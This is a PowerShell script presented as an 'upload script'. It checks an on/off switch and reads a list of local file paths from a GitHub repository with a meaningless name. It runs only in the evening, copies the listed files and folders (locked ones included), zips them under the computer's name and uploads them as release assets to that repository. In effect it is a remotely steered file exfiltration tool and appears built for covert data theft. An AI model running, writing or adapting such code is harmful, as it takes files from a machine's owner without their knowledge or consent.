# === console.ps1 Upload Script ===
[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
$OutputEncoding = [System.Text.UTF8Encoding]::UTF8

# ==== Configuration ====
$repo = "ertgyhujkfghj/2"
$token = $env:GH_TOKEN
$taskName = "console"

if (-not $token) {
    Write-Host "❌ GH_TOKEN is not set, exiting script"
    exit 1
}

# ==== Time Window (19:30 - 00:00 daily) ====
$now = Get-Date
$startTime = [datetime]::Today.AddHours(19).AddMinutes(30)
$endTime = [datetime]::Today.AddDays(1)
if ($now -lt $startTime -or $now -ge $endTime) {
    Write-Host "🕒 Not in allowed time range (19:30 ~ 00:00), exiting"
    exit 0
}

# ==== Read Upload Configuration ====
$enabledUrl = "https://raw.githubusercontent.com/$repo/main/.github/upload-enabled.txt"
$pathListUrl = "https://raw.githubusercontent.com/$repo/main/.github/upload-path.txt"

# ==== Check Upload Switch ====
try {
    $enabled = Invoke-RestMethod -Uri $enabledUrl -UseBasicParsing
    if ($enabled.Trim().ToLower() -ne "on") {
        Write-Host "🛑 Upload switch is OFF, exiting"
        exit 0
    }
} catch {
    Write-Warning "❌ Failed to read upload switch: $($_.Exception.Message)"
    exit 1
}

# ==== Get Upload Paths ====
try {
    $pathsRaw = Invoke-RestMethod -Uri $pathListUrl -UseBasicParsing
    $uploadPaths = $pathsRaw -split "`n" | Where-Object { $_.Trim() -ne "" }
    Write-Host "`n📦 Upload paths:"
    $uploadPaths | ForEach-Object { Write-Host " - $_" }
} catch {
    Write-Warning "❌ Failed to fetch upload paths: $($_.Exception.Message)"
    exit 1
}

# ==== Copy Files to Temp (try to copy locked files too) ====
$tempDir = "$env:TEMP\upload_temp_$(Get-Random)"
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

foreach ($path in $uploadPaths) {
    if (-not (Test-Path $path)) {
        Write-Warning "⚠️ Path does not exist, skipping: $path"
        continue
    }
    $item = Get-Item $path -Force
    try {
        if ($item.PSIsContainer) {
            $dest = Join-Path $tempDir $item.Name
            Copy-Item -Path $item.FullName -Destination $dest -Recurse -Force -ErrorAction SilentlyContinue
            Write-Host "📁 Copied folder: $($item.FullName)"
        } else {
            $dest = Join-Path $tempDir $item.Name
            Copy-Item -Path $item.FullName -Destination $dest -Force -ErrorAction SilentlyContinue
            Write-Host "📄 Copied file: $($item.FullName)"
        }
    } catch {
        Write-Warning "⚠️ Failed to copy: $($item.FullName)"
    }
}

# ==== Compress into ZIP ====
Add-Type -AssemblyName System.IO.Compression.FileSystem
$computerName = $env:COMPUTERNAME
$tag = "upload-$computerName-$(Get-Date -Format 'yyyyMMdd-HHmmss')"
$zipPath = "$env:TEMP\$tag.zip"
try {
    [System.IO.Compression.ZipFile]::CreateFromDirectory($tempDir, $zipPath)
    Write-Host "📦 Compressed to ZIP: $zipPath"
} catch {
    Write-Warning "❌ Compression failed: $($_.Exception.Message)"
    Remove-Item $tempDir -Recurse -Force
    exit 1
}
Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue

# ==== Upload to GitHub Release ====
$uploadUrl = "https://api.github.com/repos/$repo/releases"
$headers = @{
    Authorization = "token $token"
    "User-Agent"  = "upload-script"
    Accept        = "application/vnd.github+json"
}
try {
    $release = Invoke-RestMethod -Uri $uploadUrl -Method Post -Headers $headers -Body (@{
        tag_name   = $tag
        name       = $tag
        draft      = $false
        prerelease = $false
    } | ConvertTo-Json -Depth 3)

    $assetUrl = "https://uploads.github.com/repos/$repo/releases/$($release.id)/assets?name=$(Split-Path $zipPath -Leaf)"
    Invoke-RestMethod -Uri $assetUrl -Method POST -Headers @{
        Authorization = "token $token"
        "Content-Type" = "application/zip"
        "User-Agent"   = "upload-script"
    } -InFile $zipPath

    Write-Host "`n✅ Upload successful: $tag.zip"
} catch {
    Write-Warning "❌ Upload failed: $($_.Exception.Message)"
}

Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
